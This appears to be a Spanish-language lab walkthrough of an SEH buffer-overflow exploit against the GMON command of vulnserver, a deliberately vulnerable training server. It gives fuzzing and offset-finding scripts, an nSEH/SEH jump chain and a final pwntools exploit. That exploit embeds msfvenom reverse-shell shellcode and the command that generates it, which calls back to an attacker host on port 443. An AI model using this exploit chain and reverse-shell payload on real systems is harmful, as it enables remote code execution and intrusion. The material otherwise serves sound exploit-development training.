# Buffer-Overflow SEH (GMON function) vulnserver

[https://github.com/stephenbradshaw/vulnserver](https://github.com/stephenbradshaw/vulnserver)

Analizamos el código fuente de vulnserver:

![Untitled](/assets/images/Buffer-Overflow-seh/Untitled.png)

En el código fuente de vulnserver vemos que gmon recibe un “/” y tiene un buffer limitado a 3950, por lo que si creamos un script  que envie a vulnserver “/” + 4000 (redondeando) debería de crashear.

Creamos el script:

![Untitled](/assets/images/Buffer-Overflow-seh/Untitled%201.png)

Atacheamos vulnserver al inmunity debugger y ejecutamos el script:

![Untitled](/assets/images/Buffer-Overflow-seh/Untitled%202.png)

Podemos ver que el error es un Access violation, si vemos cuanto vale SEH:

![Untitled](/assets/images/Buffer-Overflow-seh/Untitled%203.png)

Se ha sobreescrito con las “A” que hemos enviado.

También podemos usar la libreria boofuzz de python, para fuzear el programa y ver donde crashea de forma muy sencilla y sin mirar el código:

```python
#!/usr/bin/python3

from boofuzz import *
import signal

#CTRL+C
def def_handler(sig,frame):
	print("\n[!]Saliendo...")
	sys.exit(1)
signal.signal(signal.SIGINT, def_handler)

IP = '192.168.234.133'
port = 9999

def main():

        session = Session(target = Target(connection = SocketConnection(IP, port, proto='tcp')), sleep_time = 3)

        s_initialize("VULN")

        s_string("GMON", fuzzable=False)
        s_delim(" ", fuzzable=False)
        s_string("BLAH")

        session.connect(s_get("VULN"))
        session.fuzz()

if __name__ == "__main__":
    main()
```

![Untitled](/assets/images/Buffer-Overflow-seh/Untitled%204.png)

![Untitled](/assets/images/Buffer-Overflow-seh/Untitled%205.png)

![Untitled](/assets/images/Buffer-Overflow-seh/Untitled%206.png)

Podemos ver por que esta crasheando vulnserver, cuando le pasamos “/.:/”

Ahora creamos otro script con la libreria pwn de python para averiguar la cantidad exacta de bytes que causan nuestra sobrescritura.

```python
#!/usr/bin/python3
from pwn import *

host = "192.168.234.133"   
port = 9999                

buffer = cyclic(10005)         

conn = remote(host, port)   
conn.recvline()            

conn.send(b"GMON /.:/" + buffer)    

conn.close()
```

Veamos cuanto vale SEH:

![Untitled](/assets/images/Buffer-Overflow-seh/Untitled%207.png)

![Untitled](/assets/images/Buffer-Overflow-seh/Untitled%208.png)

Ahora con python podemos saber cuanto es el offset: 3547

Vamos a comprobar que es cierto y podemos sobreescribir SEH:

```python
#!/usr/bin/python3
from pwn import *

host = "192.168.234.133"   
port = 9999                

SEH = b'BBBB'
nSEH = b'CCCC'

buffer = b"A"*3547      
buffer += nSEH
buffer += SEH
buffer += b'C' * (10005 - len(buffer))

conn = remote(host, port)   
conn.recvline()            
conn.send(b"GMON /.:/" + buffer)    
conn.close()
```

![Untitled](/assets/images/Buffer-Overflow-seh/Untitled%209.png)

Vamos a buscar si tiene algun badchar, modificamos el script de esta manera:

```python
#!/usr/bin/python3
from pwn import *

host = "192.168.234.133"   
port = 9999                
SEH = b'BBBB'
nSEH = b'CCCC'
badchar = (b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
b"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
b"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
b"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
b"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
b"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")      

buffer = b"A"*(3547 - len(badchar))
buffer += badchar
buffer += nSEH
buffer += SEH
buffer += b'C' * (10005 - len(buffer))

conn = remote(host, port)   
conn.recvline()            
conn.send(b"GMON /.:/" + buffer)    
conn.close()
```

Comprobamos el ESP:

![Untitled](/assets/images/Buffer-Overflow-seh/Untitled%2010.png)

No hay ningun badchar.

Con mona buscamos la direccion de POP 

![Untitled](/assets/images/Buffer-Overflow-seh/Untitled%2011.png)

Cargamos la direccion en nuestro script y comprobamos:

```python
#!/usr/bin/python3
from pwn import *

host = "192.168.234.133"   
port = 9999                
SEH = p32(0x625010B4)
nSEH = b'CCCC'

buffer = b"A"*3547
buffer += nSEH
buffer += SEH
buffer += b'C' * (10005 - len(buffer))

conn = remote(host, port)   
conn.recvline()            
conn.send(b"GMON /.:/" + buffer)    
conn.close()
```

Ponemos un breakpoint con F2

![Untitled](/assets/images/Buffer-Overflow-seh/Untitled%2012.png)

Hacemos Shift + F9 para ver la siguiente instrucción:

![Untitled](/assets/images/Buffer-Overflow-seh/Untitled%2013.png)

Click en la dirección y pulsamos F7 para ver donde va y estamos en las 4 “C” que hemos metido.

![Untitled](/assets/images/Buffer-Overflow-seh/Untitled%2014.png)

![Untitled](/assets/images/Buffer-Overflow-seh/Untitled%2015.png)

Con esta herramienta [link](https://raw.githubusercontent.com/h0mbre/Offset/master/offset.py), Podemos obtener la diferencia entre el ESP y la dirección de la primera 'A'.

Con la herramienta de metasploit tenemos que ajustar el ESP, para ello colocamos el PUSH EAX en la pila para mantener el valor, luego POP en el AEX, luego agregamos nuestro valor de offset ADD ax, 0x5c5 y finalmente saltamos a EAX

![Untitled](/assets/images/Buffer-Overflow-seh/Untitled%2016.png)

Ya tenemos todo lo que necesitamos. Ahora a construir el exploit.

```python
#!/usr/bin/python3
from pwn import *

host = "192.168.234.133"   
port = 9999                

SEH = p32(0x625010B4) # direccion sacada de !mona seh
nSEH = p32(0x909007eb) # direccion con 2 NOPS (9090) + 7bytes (07) + eb(JMP)
goback = b'\x54\x58\x66\x05\xc5\x05\xff\xe0' # construido con lo extraido arriba de offset.py y msf-nasm_shell

buffer = b"A"*3547
buffer += nSEH
buffer += SEH
buffer += goback
buffer += b'C' * (10005 - len(buffer))

conn = remote(host, port)   
conn.recvline()            
conn.send(b"GMON /.:/" + buffer)    
conn.close()
```

goback son los datos que nos arrojo el script que utilizamos en little indian.

ahora nSEH vale 2 NOPS y 07(los bytes que necesitamos) y eb(JMP).

Si lo lanzamos y vemos el resultado:

![Untitled](/assets/images/Buffer-Overflow-seh/Untitled%2017.png)

Hemos saltado al buffer grande donde podemos depositar nuestro shellcode:

`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.234.130 LPORT=443 -f python -b '\x00’`

```python
#!/usr/bin/python3
from pwn import *

host = "192.168.234.133"   
port = 9999                

buf =  b""
buf += b"\xb8\xc4\x27\xbf\x6d\xdb\xdb\xd9\x74\x24\xf4\x5b\x33"
buf += b"\xc9\xb1\x52\x31\x43\x12\x03\x43\x12\x83\x07\x23\x5d"
buf += b"\x98\x7b\xc4\x23\x63\x83\x15\x44\xed\x66\x24\x44\x89"
buf += b"\xe3\x17\x74\xd9\xa1\x9b\xff\x8f\x51\x2f\x8d\x07\x56"
buf += b"\x98\x38\x7e\x59\x19\x10\x42\xf8\x99\x6b\x97\xda\xa0"
buf += b"\xa3\xea\x1b\xe4\xde\x07\x49\xbd\x95\xba\x7d\xca\xe0"
buf += b"\x06\xf6\x80\xe5\x0e\xeb\x51\x07\x3e\xba\xea\x5e\xe0"
buf += b"\x3d\x3e\xeb\xa9\x25\x23\xd6\x60\xde\x97\xac\x72\x36"
buf += b"\xe6\x4d\xd8\x77\xc6\xbf\x20\xb0\xe1\x5f\x57\xc8\x11"
buf += b"\xdd\x60\x0f\x6b\x39\xe4\x8b\xcb\xca\x5e\x77\xed\x1f"
buf += b"\x38\xfc\xe1\xd4\x4e\x5a\xe6\xeb\x83\xd1\x12\x67\x22"
buf += b"\x35\x93\x33\x01\x91\xff\xe0\x28\x80\xa5\x47\x54\xd2"
buf += b"\x05\x37\xf0\x99\xa8\x2c\x89\xc0\xa4\x81\xa0\xfa\x34"
buf += b"\x8e\xb3\x89\x06\x11\x68\x05\x2b\xda\xb6\xd2\x4c\xf1"
buf += b"\x0f\x4c\xb3\xfa\x6f\x45\x70\xae\x3f\xfd\x51\xcf\xab"
buf += b"\xfd\x5e\x1a\x7b\xad\xf0\xf5\x3c\x1d\xb1\xa5\xd4\x77"
buf += b"\x3e\x99\xc5\x78\x94\xb2\x6c\x83\x7f\x7d\xd8\x61\xfd"
buf += b"\x15\x1b\x75\x03\x5d\x92\x93\x69\xb1\xf3\x0c\x06\x28"
buf += b"\x5e\xc6\xb7\xb5\x74\xa3\xf8\x3e\x7b\x54\xb6\xb6\xf6"
buf += b"\x46\x2f\x37\x4d\x34\xe6\x48\x7b\x50\x64\xda\xe0\xa0"
buf += b"\xe3\xc7\xbe\xf7\xa4\x36\xb7\x9d\x58\x60\x61\x83\xa0"
buf += b"\xf4\x4a\x07\x7f\xc5\x55\x86\xf2\x71\x72\x98\xca\x7a"
buf += b"\x3e\xcc\x82\x2c\xe8\xba\x64\x87\x5a\x14\x3f\x74\x35"
buf += b"\xf0\xc6\xb6\x86\x86\xc6\x92\x70\x66\x76\x4b\xc5\x99"
buf += b"\xb7\x1b\xc1\xe2\xa5\xbb\x2e\x39\x6e\xcb\x64\x63\xc7"
buf += b"\x44\x21\xf6\x55\x09\xd2\x2d\x99\x34\x51\xc7\x62\xc3"
buf += b"\x49\xa2\x67\x8f\xcd\x5f\x1a\x80\xbb\x5f\x89\xa1\xe9"

SEH = p32(0x625010B4)
nSEH = p32(0x909006eb)
goback = b'\x54\x58\x66\x05\xc5\x05\xff\xe0'

buffer = buf
buffer += b"A"*(3547 - len(buf))
buffer += nSEH
buffer += SEH
buffer += goback
buffer += b'C' * (10005 - len(buffer))

conn = remote(host, port)   
conn.recvline()            
conn.send(b"GMON /.:/" + buffer)    
conn.close()
```

![Untitled](/assets/images/Buffer-Overflow-seh/Untitled%2018.png)